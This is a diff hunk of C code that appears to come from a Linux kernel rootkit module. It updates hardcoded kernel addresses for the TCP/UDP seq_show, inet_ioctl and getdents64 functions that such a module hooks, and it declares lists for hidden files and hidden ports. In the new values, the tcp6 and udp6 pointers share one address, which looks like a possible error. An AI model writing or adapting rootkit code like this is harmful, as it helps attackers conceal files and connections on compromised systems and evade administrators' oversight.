@@ -42,16 +42,16 @@ module_param(name, charp, S_IRUGO);
 // MODULE_PARM_DESC(name, "The name to display in /var/log/kern.log");
 
 typedef int seq_show(struct seq_file *,void *);
-seq_show *tcp4_seq_show_ptr = 0xffffffffb6d78540;
-seq_show *tcp6_seq_show_ptr = 0xffffffffb6e2b8e0;
-seq_show *udp4_seq_show_ptr = 0xffffffffb6d87eb0;
-seq_show *udp6_seq_show_ptr = 0xffffffffb6e1b280;
+seq_show *tcp4_seq_show_ptr = 0xffffffff81f0e510;
+seq_show *tcp6_seq_show_ptr = 0xffffffff81fdddf0;
+seq_show *udp4_seq_show_ptr = 0xffffffff81f335e0;
+seq_show *udp6_seq_show_ptr = 0xffffffff81fdddf0;
 
 typedef int inet_ioctl(struct socket *, unsigned int, unsigned int);
-inet_ioctl *inet_ioctl_ptr = 0xffffffffb6d99a20;
+inet_ioctl *inet_ioctl_ptr = 0xffffffff82aef514;
 
 typedef asmlinkage long sys_getdents64(const struct pt_regs *regs);
-sys_getdents64 *orig_getdents64 = 0xffffffffb658ca50;
+sys_getdents64 *orig_getdents64 = 0xffffffff814d2340;
 
 LIST_HEAD(hidden_files);
 LIST_HEAD(hidden_ports);
